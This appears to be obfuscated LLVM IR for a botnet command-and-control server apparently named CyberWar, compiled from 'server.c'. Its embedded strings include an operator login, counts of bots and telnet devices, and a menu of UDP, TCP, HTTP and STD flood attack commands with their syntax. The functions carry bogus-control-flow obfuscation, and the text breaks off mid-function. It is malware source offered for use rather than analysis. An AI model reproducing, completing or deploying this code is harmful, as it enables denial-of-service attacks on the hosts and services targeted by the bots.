; ModuleID = 'host/ir_bcf/CyberWar.ll'
source_filename = "server.c"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.clientdata_t = type { i32, i8 }
%struct.telnetdata_t = type { i32 }
%struct._IO_FILE = type { i32, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, %struct._IO_marker*, %struct._IO_FILE*, i32, i32, i64, i16, i8, [1 x i8], i8*, i64, i8*, i8*, i8*, i8*, i64, i32, [20 x i8] }
%struct._IO_marker = type { %struct._IO_marker*, %struct._IO_FILE*, i32 }
%struct.login_info = type { [20 x i8], [20 x i8] }
%struct.tm = type { i32, i32, i32, i32, i32, i32, i32, i32, i32, i64, i8* }
%struct.epoll_event = type <{ i32, %union.epoll_data }>
%union.epoll_data = type { i8* }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.in_addr = type { i32 }
%union.pthread_attr_t = type { i64, [48 x i8] }
%struct.addrinfo = type { i32, i32, i32, i32, i32, %struct.sockaddr*, i8*, %struct.addrinfo* }

@.str = private unnamed_addr constant [5 x i8] c"PING\00", align 1
@clients = common global [1000000 x %struct.clientdata_t] zeroinitializer, align 16
@managements = common global [1000000 x %struct.telnetdata_t] zeroinitializer, align 16
@.str.1 = private unnamed_addr constant [6 x i8] c"\1B[31m\00", align 1
@.str.2 = private unnamed_addr constant [3 x i8] c": \00", align 1
@.str.3 = private unnamed_addr constant [16 x i8] c"sent to fd: %d\0A\00", align 1
@.str.4 = private unnamed_addr constant [16 x i8] c"\0D\0A\1B[32mLinux~: \00", align 1
@.str.5 = private unnamed_addr constant [2 x i8] c"\0A\00", align 1
@epollFD = internal global i32 0, align 4
@listenFD = internal global i32 0, align 4
@.str.6 = private unnamed_addr constant [7 x i8] c"accept\00", align 1
@.str.7 = private unnamed_addr constant [14 x i8] c"!* LOLNOGTFO\0A\00", align 1
@.str.8 = private unnamed_addr constant [10 x i8] c"epoll_ctl\00", align 1
@.str.9 = private unnamed_addr constant [15 x i8] c"!* SCANNER ON\0A\00", align 1
@.str.10 = private unnamed_addr constant [6 x i8] c"PONG\0A\00", align 1
@.str.11 = private unnamed_addr constant [8 x i8] c"REPORT \00", align 1
@telFD = internal global %struct._IO_FILE* null, align 8
@.str.12 = private unnamed_addr constant [4 x i8] c"%s\0A\00", align 1
@TELFound = internal global i32 0, align 4
@.str.13 = private unnamed_addr constant [8 x i8] c"PROBING\00", align 1
@scannerreport = internal global i32 0, align 4
@.str.14 = private unnamed_addr constant [15 x i8] c"REMOVING PROBE\00", align 1
@.str.15 = private unnamed_addr constant [5 x i8] c"PONG\00", align 1
@.str.16 = private unnamed_addr constant [11 x i8] c"buf: \22%s\22\0A\00", align 1
@.str.17 = private unnamed_addr constant [47 x i8] c"%c]0;Bots Connected: %d | User(s) Online: %d%c\00", align 1
@OperatorsConnected = internal global i32 0, align 4
@.str.18 = private unnamed_addr constant [10 x i8] c"login.txt\00", align 1
@.str.19 = private unnamed_addr constant [2 x i8] c"r\00", align 1
@.str.20 = private unnamed_addr constant [6 x i8] c"%s %s\00", align 1
@accounts = internal global [22 x %struct.login_info] zeroinitializer, align 16
@.str.21 = private unnamed_addr constant [22 x i8] c"\1B[37mLogin ID: \1B[30m \00", align 1
@.str.22 = private unnamed_addr constant [3 x i8] c"%s\00", align 1
@.str.23 = private unnamed_addr constant [22 x i8] c"\1B[37mPasscode: \1B[30m \00", align 1
@.str.24 = private unnamed_addr constant [5 x i8] c"\1B[1A\00", align 1
@.str.25 = private unnamed_addr constant [48 x i8] c"\1B[31mIP Logged, Disconnecting From Session...\0D\0A\00", align 1
@.str.26 = private unnamed_addr constant [92 x i8] c"\1B[32m  ######  ##    ## ########  ######## ########  \1B[31m##      ##    ###    ########  \0D\0A\00", align 1
@.str.27 = private unnamed_addr constant [92 x i8] c"\1B[32m ##    ##  ##  ##  ##     ## ##       ##     ## \1B[31m##  ##  ##   ## ##   ##     ## \0D\0A\00", align 1
@.str.28 = private unnamed_addr constant [92 x i8] c"\1B[32m ##         ####   ##     ## ##       ##     ## \1B[31m##  ##  ##  ##   ##  ##     ## \0D\0A\00", align 1
@.str.29 = private unnamed_addr constant [92 x i8] c"\1B[32m ##          ##    ########  ######   ########  \1B[31m##  ##  ## ##     ## ########  \0D\0A\00", align 1
@.str.30 = private unnamed_addr constant [92 x i8] c"\1B[32m ##          ##    ##     ## ##       ##   ##   \1B[31m##  ##  ## ######### ##   ##   \0D\0A\00", align 1
@.str.31 = private unnamed_addr constant [92 x i8] c"\1B[32m ##    ##    ##    ##     ## ##       ##    ##  \1B[31m##  ##  ## ##     ## ##    ##  \0D\0A\00", align 1
@.str.32 = private unnamed_addr constant [158 x i8] c"\1B[32m  ######     ##    ########  ######## ##     ##  \1B[31m###  ###  ##     ## ##     ##                                                                   \0D\0A\00", align 1
@.str.33 = private unnamed_addr constant [82 x i8] c"\1B[31m     _____________________________________________________________________\0D\0A\00", align 1
@.str.34 = private unnamed_addr constant [9 x i8] c"\1B[30m \0D\0A\00", align 1
@.str.35 = private unnamed_addr constant [74 x i8] c"                              \1B[37m \1B[37m[ \1B[32mYour ID: \1B[31m%s\1B[37m ]\0D\0A\00", align 1
@.str.36 = private unnamed_addr constant [84 x i8] c"                          \1B[37m \1B[37m[ \1B[32mOpen Main Menu With: \1B[31mMenu\1B[37m ]\0D\0A\00", align 1
@.str.37 = private unnamed_addr constant [13 x i8] c"\1B[37mLinux~:\00", align 1
@.str.38 = private unnamed_addr constant [5 x i8] c"Bots\00", align 1
@.str.39 = private unnamed_addr constant [68 x i8] c"Bots Connected: [\1B[32m %d \1B[37m] | Users Online: [\1B[32m %d \1B[37m]\0D\0A\00", align 1
@.str.40 = private unnamed_addr constant [5 x i8] c"Stat\00", align 1
@.str.41 = private unnamed_addr constant [62 x i8] c"Telnet Devices: [\1B[32m %d \1B[37m] | Status: [\1B[32m %d \1B[37m]\0D\0A\00", align 1
@.str.42 = private unnamed_addr constant [5 x i8] c"Menu\00", align 1
@.str.43 = private unnamed_addr constant [54 x i8] c"\0D\0A\1B[37m[ \1B[32mYou Have Opened The Menu, %s \1B[37m]\0D\0A\0D\0A\00", align 1
@.str.44 = private unnamed_addr constant [68 x i8] c"\1B[32m#   \1B[32m UDP Attack: \1B[32m!* UDP [IP] [Port] [Time] 32 0 10\0D\0A\00", align 1
@.str.45 = private unnamed_addr constant [72 x i8] c"\1B[32m#   \1B[32m TCP Attack: \1B[32m!* TCP [IP] [Port] [Time] 32 all 0 10\0D\0A\00", align 1
@.str.46 = private unnamed_addr constant [56 x i8] c"\1B[32m#   \1B[32m HTTP Attack: \1B[32m!* HTTP [Url] [Time]\0D\0A\00", align 1
@.str.47 = private unnamed_addr constant [60 x i8] c"\1B[32m#   \1B[32m STD Attack: \1B[32m!* STD [IP] [Port] [Time]\0D\0A\00", align 1
@.str.48 = private unnamed_addr constant [12 x i8] c"   \1B[30m \0D\0A\00", align 1
@.str.49 = private unnamed_addr constant [76 x i8] c"   \1B[32m  ---------------------------------------------------------------\0D\0A\00", align 1
@.str.50 = private unnamed_addr constant [57 x i8] c"\1B[32m#   \1B[32m Main Menu:     \1B[31m[ \1B[32mMenu  \1B[31m]\0D\0A\00", align 1
@.str.51 = private unnamed_addr constant [57 x i8] c"\1B[32m#   \1B[32m Bot Count:     \1B[31m[ \1B[32mBots  \1B[31m]\0D\0A\00", align 1
@.str.52 = private unnamed_addr constant [57 x i8] c"\1B[32m#   \1B[32m Telnet Status: \1B[31m[ \1B[32mStat  \1B[31m]\0D\0A\00", align 1
@.str.53 = private unnamed_addr constant [57 x i8] c"\1B[32m#   \1B[32m Logout:        \1B[31m[ \1B[32mLog   \1B[31m]\0D\0A\00", align 1
@.str.54 = private unnamed_addr constant [57 x i8] c"\1B[32m#   \1B[32m Kill Attack:   \1B[31m[ \1B[32mKill  \1B[31m]\0D\0A\00", align 1
@.str.55 = private unnamed_addr constant [57 x i8] c"\1B[32m#   \1B[32m Clear Screen:  \1B[31m[ \1B[32mClear \1B[31m]\0D\0A\00", align 1
@.str.56 = private unnamed_addr constant [57 x i8] c"\1B[32m#   \1B[32m Credits:       \1B[31m[ \1B[32mCreds \1B[31m]\0D\0A\00", align 1
@.str.57 = private unnamed_addr constant [7 x i8] c"Hidden\00", align 1
@.str.58 = private unnamed_addr constant [50 x i8] c"   \0D\0A\1B[32m[\1B[32m You Must Be A 1337 ;) \1B[32m]\0D\0A\0D\0A\00", align 1
@.str.59 = private unnamed_addr constant [56 x i8] c"   \1B[32m UDP - \1B[32m!* UDP [IP] [Port] [Time] 32 0 10\0D\0A\00", align 1
@.str.60 = private unnamed_addr constant [60 x i8] c"   \1B[32m TCP - \1B[32m!* TCP [IP] [Port] [Time] 32 all 0 10\0D\0A\00", align 1
@.str.61 = private unnamed_addr constant [44 x i8] c"   \1B[32m HTTP - \1B[32m!* HTTP [Url] [Time]\0D\0A\00", align 1
@.str.62 = private unnamed_addr constant [48 x i8] c"   \1B[32m STD - \1B[32m!* STD [IP] [PORT] [TIME]\0D\0A\00", align 1
@.str.63 = private unnamed_addr constant [5 x i8] c"Kill\00", align 1
@.str.64 = private unnamed_addr constant [19 x i8] c"\1B[32m!* KILLATTK\0D\0A\00", align 1
@.str.65 = private unnamed_addr constant [6 x i8] c"Clear\00", align 1
@.str.66 = private unnamed_addr constant [11 x i8] c"\1B[2J\1B[1;1H\00", align 1
@.str.67 = private unnamed_addr constant [6 x i8] c"Creds\00", align 1
@.str.68 = private unnamed_addr constant [57 x i8] c"\0D\0A\1B[34mCredits-> \1B[32mMade By Vendettxs On Instagram\0D\0A\0D\0A\00", align 1
@.str.69 = private unnamed_addr constant [6 x i8] c"Ports\00", align 1
@.str.70 = private unnamed_addr constant [98 x i8] c"\0D\0A\1B[37mPORTS: \1B[31mXBOX Services: 3074 | PSN Services: 443 | DEFAULT: 80 | DNS/Nameserver: 53\0D\0A\0D\0A\00", align 1
@.str.71 = private unnamed_addr constant [4 x i8] c"Log\00", align 1
@.str.72 = private unnamed_addr constant [40 x i8] c"Terminating Session. Logging Out ID: %s\00", align 1
@.str.73 = private unnamed_addr constant [10 x i8] c"%s: \22%s\22\0A\00", align 1
@.str.74 = private unnamed_addr constant [11 x i8] c"server.log\00", align 1
@.str.75 = private unnamed_addr constant [2 x i8] c"a\00", align 1
@.str.76 = private unnamed_addr constant [9 x i8] c"%I:%M %p\00", align 1
@.str.77 = private unnamed_addr constant [13 x i8] c"[%s] %s: %s\0A\00", align 1
@.str.78 = private unnamed_addr constant [21 x i8] c"ERROR opening socket\00", align 1
@.str.79 = private unnamed_addr constant [17 x i8] c"ERROR on binding\00", align 1
@.str.80 = private unnamed_addr constant [16 x i8] c"ERROR on accept\00", align 1
@stderr = external global %struct._IO_FILE*, align 8
@.str.81 = private unnamed_addr constant [39 x i8] c"Usage: %s [port] [threads] [cnc-port]\0A\00", align 1
@.str.82 = private unnamed_addr constant [11 x i8] c"telnet.txt\00", align 1
@.str.83 = private unnamed_addr constant [3 x i8] c"a+\00", align 1
@.str.84 = private unnamed_addr constant [7 x i8] c"listen\00", align 1
@.str.85 = private unnamed_addr constant [13 x i8] c"epoll_create\00", align 1
@.str.86 = private unnamed_addr constant [4 x i8] c"FBI\00", align 1
@.str.87 = private unnamed_addr constant [6 x i8] c"fcntl\00", align 1
@.str.88 = private unnamed_addr constant [17 x i8] c"getaddrinfo: %s\0A\00", align 1
@.str.89 = private unnamed_addr constant [11 x i8] c"setsockopt\00", align 1
@.str.90 = private unnamed_addr constant [16 x i8] c"Could not bind\0A\00", align 1
@x = common global i32 0
@y = common global i32 0
@x.1 = common global i32 0
@y.2 = common global i32 0
@x.3 = common global i32 0
@y.4 = common global i32 0
@x.5 = common global i32 0
@y.6 = common global i32 0
@x.7 = common global i32 0
@y.8 = common global i32 0
@x.9 = common global i32 0
@y.10 = common global i32 0
@x.11 = common global i32 0
@y.12 = common global i32 0
@x.13 = common global i32 0
@y.14 = common global i32 0
@x.15 = common global i32 0
@y.16 = common global i32 0
@x.17 = common global i32 0
@y.18 = common global i32 0
@x.19 = common global i32 0
@y.20 = common global i32 0
@x.21 = common global i32 0
@y.22 = common global i32 0

; Function Attrs: noinline nounwind uwtable
define i32 @fdgets(i8*, i32, i32) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  store i32 0, i32* %7, align 4
  store i32 1, i32* %8, align 4
  br label %9

; <label>:9:                                      ; preds = %43, %3
  %10 = load i32, i32* %8, align 4
  %11 = icmp eq i32 %10, 1
  br i1 %11, label %12, label %41

; <label>:12:                                     ; preds = %9
  %13 = load i32, i32* @x
  %14 = load i32, i32* @y
  %15 = sub i32 %13, 1
  %16 = mul i32 %13, %15
  %17 = urem i32 %16, 2
  %18 = icmp eq i32 %17, 0
  %19 = icmp slt i32 %14, 10
  %20 = or i1 %18, %19
  br i1 %20, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %12
  %21 = load i32, i32* %7, align 4
  %22 = load i32, i32* %5, align 4
  %23 = icmp slt i32 %21, %22
  %24 = load i32, i32* @x
  %25 = load i32, i32* @y
  %26 = sub i32 %24, 1
  %27 = mul i32 %24, %26
  %28 = urem i32 %27, 2
  %29 = icmp eq i32 %28, 0
  %30 = icmp slt i32 %25, 10
  %31 = or i1 %29, %30
  br i1 %31, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %23, label %32, label %41

; <label>:32:                                     ; preds = %originalBBpart2
  %33 = load i8*, i8** %4, align 8
  %34 = load i32, i32* %7, align 4
  %35 = sext i32 %34 to i64
  %36 = getelementptr inbounds i8, i8* %33, i64 %35
  %37 = getelementptr inbounds i8, i8* %36, i64 -1
  %38 = load i8, i8* %37, align 1
  %39 = zext i8 %38 to i32
  %40 = icmp ne i32 %39, 10
  br label %41

; <label>:41:                                     ; preds = %32, %originalBBpart2, %9
  %42 = phi i1 [ false, %originalBBpart2 ], [ false, %9 ], [ %40, %32 ]
  br i1 %42, label %43, label %53

; <label>:43:                                     ; preds = %41
  %44 = load i32, i32* %6, align 4
  %45 = load i8*, i8** %4, align 8
  %46 = load i32, i32* %7, align 4
  %47 = sext i32 %46 to i64
  %48 = getelementptr inbounds i8, i8* %45, i64 %47
  %49 = call i64 @read(i32 %44, i8* %48, i64 1)
  %50 = trunc i64 %49 to i32
  store i32 %50, i32* %8, align 4
  %51 = load i32, i32* %7, align 4
  %52 = add nsw i32 %51, 1
  store i32 %52, i32* %7, align 4
  br label %9

; <label>:53:                                     ; preds = %41
  %54 = load i32, i32* %8, align 4
  ret i32 %54

originalBBalteredBB:                              ; preds = %originalBB, %12
  %55 = load i32, i32* %7, align 4
  %56 = load i32, i32* %5, align 4
  %57 = icmp slt i32 %55, %56
  br label %originalBB
}

declare i64 @read(i32, i8*, i64) #1

; Function Attrs: noinline nounwind uwtable
define void @trim(i8*) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %2, align 8
  store i32 0, i32* %4, align 4
  %6 = load i8*, i8** %2, align 8
  %7 = call i64 @strlen(i8* %6) #8
  %8 = sub i64 %7, 1
  %9 = trunc i64 %8 to i32
  store i32 %9, i32* %5, align 4
  br label %10

; <label>:10:                                     ; preds = %originalBBpart2, %1
  %11 = load i8*, i8** %2, align 8
  %12 = load i32, i32* %4, align 4
  %13 = sext i32 %12 to i64
  %14 = getelementptr inbounds i8, i8* %11, i64 %13
  %15 = load i8, i8* %14, align 1
  %16 = sext i8 %15 to i32
  %17 = call i32 @isspace(i32 %16) #8
  %18 = icmp ne i32 %17, 0
  br i1 %18, label %19, label %38

; <label>:19:                                     ; preds = %10
  %20 = load i32, i32* @x.1
  %21 = load i32, i32* @y.2
  %22 = sub i32 %20, 1
  %23 = mul i32 %20, %22
  %24 = urem i32 %23, 2
  %25 = icmp eq i32 %24, 0
  %26 = icmp slt i32 %21, 10
  %27 = or i1 %25, %26
  br i1 %27, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %19
  %28 = load i32, i32* %4, align 4
  %29 = add nsw i32 %28, 1
  store i32 %29, i32* %4, align 4
  %30 = load i32, i32* @x.1
  %31 = load i32, i32* @y.2
  %32 = sub i32 %30, 1
  %33 = mul i32 %30, %32
  %34 = urem i32 %33, 2
  %35 = icmp eq i32 %34, 0
  %36 = icmp slt i32 %31, 10
  %37 = or i1 %35, %36
  br i1 %37, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %10

; <label>:38:                                     ; preds = %10
  br label %39

; <label>:39:                                     ; preds = %86, %38
  %40 = load i32, i32* @x.1
  %41 = load i32, i32* @y.2
  %42 = sub i32 %40, 1
  %43 = mul i32 %40, %42
  %44 = urem i32 %43, 2
  %45 = icmp eq i32 %44, 0
  %46 = icmp slt i32 %41, 10
  %47 = or i1 %45, %46
  br i1 %47, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %39
  %48 = load i32, i32* %5, align 4
  %49 = load i32, i32* %4, align 4
  %50 = icmp sge i32 %48, %49
  %51 = load i32, i32* @x.1
  %52 = load i32, i32* @y.2
  %53 = sub i32 %51, 1
  %54 = mul i32 %51, %53
  %55 = urem i32 %54, 2
  %56 = icmp eq i32 %55, 0
  %57 = icmp slt i32 %52, 10
  %58 = or i1 %56, %57
  br i1 %58, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br i1 %50, label %59, label %68

; <label>:59:                                     ; preds = %originalBBpart216
  %60 = load i8*, i8** %2, align 8
  %61 = load i32, i32* %5, align 4
  %62 = sext i32 %61 to i64
  %63 = getelementptr inbounds i8, i8* %60, i64 %62
  %64 = load i8, i8* %63, align 1
  %65 = sext i8 %64 to i32
  %66 = call i32 @isspace(i32 %65) #8
  %67 = icmp ne i32 %66, 0
  br label %68

; <label>:68:                                     ; preds = %59, %originalBBpart216
  %69 = phi i1 [ false, %originalBBpart216 ], [ %67, %59 ]
  %70 = load i32, i32* @x.1
  %71 = load i32, i32* @y.2
  %72 = sub i32 %70, 1
  %73 = mul i32 %70, %72
  %74 = urem i32 %73, 2
  %75 = icmp eq i32 %74, 0
  %76 = icmp slt i32 %71, 10
  %77 = or i1 %75, %76
  br i1 %77, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %68
  %78 = load i32, i32* @x.1
  %79 = load i32, i32* @y.2
  %80 = sub i32 %78, 1
  %81 = mul i32 %78, %80
  %82 = urem i32 %81, 2
  %83 = icmp eq i32 %82, 0
  %84 = icmp slt i32 %79, 10
  %85 = or i1 %83, %84
  br i1 %85, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br i1 %69, label %86, label %89

; <label>:86:                                     ; preds = %originalBBpart220
  %87 = load i32, i32* %5, align 4
  %88 = add nsw i32 %87, -1
  store i32 %88, i32* %5, align 4
  br label %39

; <label>:89:                                     ; preds = %originalBBpart220
  %90 = load i32, i32* %4, align 4
  store i32 %90, i32* %3, align 4
  br label %91

; <label>:91:                                     ; preds = %123, %89
  %92 = load i32, i32* @x.1
  %93 = load i32, i32* @y.2
  %94 = sub i32 %92, 1
  %95 = mul i32 %92, %94
  %96 = urem i32 %95, 2
  %97 = icmp eq i32 %96, 0
  %98 = icmp slt i32 %93, 10
  %99 = or i1 %97, %98
  br i1 %99, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %91
  %100 = load i32, i32* %3, align 4
  %101 = load i32, i32* %5, align 4
  %102 = icmp sle i32 %100, %101
  %103 = load i32, i32* @x.1
  %104 = load i32, i32* @y.2
  %105 = sub i32 %103, 1
  %106 = mul i32 %103, %105
  %107 = urem i32 %106, 2
  %108 = icmp eq i32 %107, 0
  %109 = icmp slt i32 %104, 10
  %110 = or i1 %108, %109
  br i1 %110, label %originalBBpart224, label %originalBB22alteredBB

originalBBpart224:                                ; preds = %originalBB22
  br i1 %102, label %111, label %126

; <label>:111:                                    ; preds = %originalBBpart224
  %112 = load i8*, i8** %2, align 8
  %113 = load i32, i32* %3, align 4
  %114 = sext i32 %113 to i64
  %115 = getelementptr inbounds i8, i8* %112, i64 %114
  %116 = load i8, i8* %115, align 1
  %117 = load i8*, i8** %2, align 8
  %118 = load i32, i32* %3, align 4
  %119 = load i32, i32* %4, align 4
  %120 = sub nsw i32 %118, %119
  %121 = sext i32 %120 to i64
  %122 = getelementptr inbounds i8, i8* %117, i64 %121
  store i8 %116, i8* %122, align 1
  br label %123

; <label>:123:                                    ; preds = %111
  %124 = load i32, i32* %3, align 4
  %125 = add nsw i32 %124, 1
  store i32 %125, i32* %3, align 4
  br label %91

; <label>:126:                                    ; preds = %originalBBpart224
  %127 = load i8*, i8** %2, align 8
  %128 = load i32, i32* %3, align 4
  %129 = load i32, i32* %4, align 4
  %130 = sub nsw i32 %128, %129
  %131 = sext i32 %130 to i64
  %132 = getelementptr inbounds i8, i8* %127, i64 %131
  store i8 0, i8* %132, align 1
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %19
  %133 = load i32, i32* %4, align 4
  %_ = sub i32 %133, 1
  %gen = mul i32 %_, 1
  %_1 = sub i32 0, %133
  %gen2 = add i32 %_1, 1
  %_3 = sub i32 %133, 1
  %gen4 = mul i32 %_3, 1
  %_5 = sub i32 %133, 1
  %gen6 = mul i32 %_5, 1
  %_7 = shl i32 %133, 1
  %_8 = sub i32 0, %133
  %gen9 = add i32 %_8, 1
  %_10 = sub i32 %133, 1
  %gen11 = mul i32 %_10, 1
  %_12 = sub i32 %133, 1
  %gen13 = mul i32 %_12, 1
  %134 = add nsw i32 %133, 1
  store i32 %134, i32* %4, align 4
  br label %originalBB

originalBB14alteredBB:                            ; preds = %originalBB14, %39
  %135 = load i32, i32* %5, align 4
  %136 = load i32, i32* %4, align 4
  %137 = icmp sge i32 %135, %136
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %68
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %91
  %138 = load i32, i32* %3, align 4
  %139 = load i32, i32* %5, align 4
  %140 = icmp sle i32 %138, %139
  br label %originalBB22
}

; Function Attrs: nounwind readonly
declare i64 @strlen(i8*) #2

; Function Attrs: nounwind readonly
declare i32 @isspace(i32) #2

; Function Attrs: noinline nounwind uwtable
define void @broadcast(i8*, i32, i8*) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i8*, align 8
  %9 = alloca i64, align 8
  %10 = alloca %struct.tm*, align 8
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i8* %2, i8** %6, align 8
  store i32 1, i32* %7, align 4
  %13 = load i8*, i8** %4, align 8
  %14 = call i32 @strcmp(i8* %13, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i32 0, i32 0)) #8
  %15 = icmp eq i32 %14, 0
  br i1 %15, label %16, label %33

; <label>:16:                                     ; preds = %3
  %17 = load i32, i32* @x.3
  %18 = load i32, i32* @y.4
  %19 = sub i32 %17, 1
  %20 = mul i32 %17, %19
  %21 = urem i32 %20, 2
  %22 = icmp eq i32 %21, 0
  %23 = icmp slt i32 %18, 10
  %24 = or i1 %22, %23
  br i1 %24, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %16
  store i32 0, i32* %7, align 4
  %25 = load i32, i32* @x.3
  %26 = load i32, i32* @y.4
  %27 = sub i32 %25, 1
  %28 = mul i32 %25, %27
  %29 = urem i32 %28, 2
  %30 = icmp eq i32 %29, 0
  %31 = icmp slt i32 %26, 10
  %32 = or i1 %30, %31
  br i1 %32, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %33

; <label>:33:                                     ; preds = %originalBBpart2, %3
  %34 = load i8*, i8** %4, align 8
  %35 = call i64 @strlen(i8* %34) #8
  %36 = add i64 %35, 10
  %37 = call noalias i8* @malloc(i64 %36) #7
  store i8* %37, i8** %8, align 8
  %38 = load i8*, i8** %8, align 8
  %39 = load i8*, i8** %4, align 8
  %40 = call i64 @strlen(i8* %39) #8
  %41 = add i64 %40, 10
  call void @llvm.memset.p0i8.i64(i8* %38, i8 0, i64 %41, i32 1, i1 false)
  %42 = load i8*, i8** %8, align 8
  %43 = load i8*, i8** %4, align 8
  %44 = call i8* @strcpy(i8* %42, i8* %43) #7
  %45 = load i8*, i8** %8, align 8
  call void @trim(i8* %45)
  %46 = call i64 @time(i64* %9) #7
  %47 = call %struct.tm* @localtime(i64* %9) #7
  store %struct.tm* %47, %struct.tm** %10, align 8
  %48 = load %struct.tm*, %struct.tm** %10, align 8
  %49 = call i8* @asctime(%struct.tm* %48) #7
  store i8* %49, i8** %11, align 8
  %50 = load i8*, i8** %11, align 8
  call void @trim(i8* %50)
  store i32 0, i32* %12, align 4
  br label %51

; <label>:51:                                     ; preds = %originalBBpart228, %33
  %52 = load i32, i32* %12, align 4
  %53 = icmp slt i32 %52, 1000000
  br i1 %53, label %54, label %219

; <label>:54:                                     ; preds = %51
  %55 = load i32, i32* @x.3
  %56 = load i32, i32* @y.4
  %57 = sub i32 %55, 1
  %58 = mul i32 %55, %57
  %59 = urem i32 %58, 2
  %60 = icmp eq i32 %59, 0
  %61 = icmp slt i32 %56, 10
  %62 = or i1 %60, %61
  br i1 %62, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %54
  %63 = load i32, i32* %12, align 4
  %64 = load i32, i32* %5, align 4
  %65 = icmp eq i32 %63, %64
  %66 = load i32, i32* @x.3
  %67 = load i32, i32* @y.4
  %68 = sub i32 %66, 1
  %69 = mul i32 %66, %68
  %70 = urem i32 %69, 2
  %71 = icmp eq i32 %70, 0
  %72 = icmp slt i32 %67, 10
  %73 = or i1 %71, %72
  br i1 %73, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %65, label %139, label %74

; <label>:74:                                     ; preds = %originalBBpart24
  %75 = load i32, i32* @x.3
  %76 = load i32, i32* @y.4
  %77 = sub i32 %75, 1
  %78 = mul i32 %75, %77
  %79 = urem i32 %78, 2
  %80 = icmp eq i32 %79, 0
  %81 = icmp slt i32 %76, 10
  %82 = or i1 %80, %81
  br i1 %82, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %74
  %83 = load i32, i32* %12, align 4
  %84 = sext i32 %83 to i64
  %85 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %84
  %86 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %85, i32 0, i32 1
  %87 = load i8, i8* %86, align 4
  %88 = icmp ne i8 %87, 0
  %89 = load i32, i32* @x.3
  %90 = load i32, i32* @y.4
  %91 = sub i32 %89, 1
  %92 = mul i32 %89, %91
  %93 = urem i32 %92, 2
  %94 = icmp eq i32 %93, 0
  %95 = icmp slt i32 %90, 10
  %96 = or i1 %94, %95
  br i1 %96, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %88, label %140, label %97

; <label>:97:                                     ; preds = %originalBBpart28
  %98 = load i32, i32* @x.3
  %99 = load i32, i32* @y.4
  %100 = sub i32 %98, 1
  %101 = mul i32 %98, %100
  %102 = urem i32 %101, 2
  %103 = icmp eq i32 %102, 0
  %104 = icmp slt i32 %99, 10
  %105 = or i1 %103, %104
  br i1 %105, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %97
  %106 = load i32, i32* %7, align 4
  %107 = icmp eq i32 %106, 0
  %108 = load i32, i32* @x.3
  %109 = load i32, i32* @y.4
  %110 = sub i32 %108, 1
  %111 = mul i32 %108, %110
  %112 = urem i32 %111, 2
  %113 = icmp eq i32 %112, 0
  %114 = icmp slt i32 %109, 10
  %115 = or i1 %113, %114
  br i1 %115, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br i1 %107, label %139, label %116

; <label>:116:                                    ; preds = %originalBBpart212
  %117 = load i32, i32* @x.3
  %118 = load i32, i32* @y.4
  %119 = sub i32 %117, 1
  %120 = mul i32 %117, %119
  %121 = urem i32 %120, 2
  %122 = icmp eq i32 %121, 0
  %123 = icmp slt i32 %118, 10
  %124 = or i1 %122, %123
  br i1 %124, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %116
  %125 = load i32, i32* %12, align 4
  %126 = sext i32 %125 to i64
  %127 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %126
  %128 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %127, i32 0, i32 0
  %129 = load i32, i32* %128, align 4
  %130 = icmp ne i32 %129, 0
  %131 = load i32, i32* @x.3
  %132 = load i32, i32* @y.4
  %133 = sub i32 %131, 1
  %134 = mul i32 %131, %133
  %135 = urem i32 %134, 2
  %136 = icmp eq i32 %135, 0
